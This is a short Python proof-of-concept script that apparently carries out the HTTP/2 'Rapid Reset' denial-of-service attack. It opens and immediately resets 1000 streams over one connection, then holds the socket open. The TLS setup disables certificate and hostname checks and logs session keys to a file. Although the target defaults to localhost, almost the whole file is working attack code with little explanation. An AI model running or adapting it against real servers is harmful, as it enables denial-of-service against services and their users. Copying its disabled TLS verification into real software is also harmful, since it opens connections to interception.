"""rrpoc"""
import socket
import ssl
import certifi

import h2.connection
import h2.events

from time import sleep

ctx = ssl.create_default_context(cafile=certifi.where())
ctx.set_alpn_protocols(['h2'])
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.keylog_filename = 'ssl-keylog.log'


def send_rr_packets(server='localhost', port=443, max_streams=1000):
    s = socket.create_connection((server, port))
    s = ctx.wrap_socket(s, server_hostname=server)
    c = h2.connection.H2Connection()
    c.initiate_connection()
    s.sendall(c.data_to_send())

    headers = [
        (':method', 'GET'),
        (':path', '/lol'),
        (':authority', server),
        (':scheme', 'https'),
    ]

    for _ in range(max_streams):
        sid = c.get_next_available_stream_id()
        c.send_headers(
            stream_id=sid,
            headers=headers,
            end_stream=True
        )
        c.reset_stream(sid)
    s.sendall(c.data_to_send())

    # Add sleep or else the socket gets closed which causes server to
    # stop trying to respond to our requests.
    sleep(60)

    s.close()


def main():
    send_rr_packets(server='localhost', port=443, max_streams=1000)


if __name__ == '__main__':
    main()
